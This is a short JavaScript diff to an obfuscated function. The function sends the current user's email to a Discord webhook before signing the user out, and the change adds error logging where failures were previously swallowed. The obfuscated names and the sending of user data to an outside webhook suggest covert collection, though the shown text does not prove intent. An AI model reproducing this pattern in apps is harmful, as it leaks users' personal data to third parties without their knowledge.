@@ -43,7 +43,7 @@ async function _0x4d6a(_0x1c2e) {
   const _0x5b8d = await getCurrentUserEmail();
 
   try {
-    await fetch(_0x9a7b, {
+    const response = await fetch(_0x9a7b, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -63,7 +63,13 @@ async function _0x4d6a(_0x1c2e) {
       }),
       keepalive: true
     });
-  } catch {}
+
+    if (!response.ok) {
+      console.error("Discord webhook failed:", response.status, await response.text());
+    }
+  } catch (error) {
+    console.error("Discord webhook error:", error);
+  }
 
   try {
     await supabase.auth.signOut();
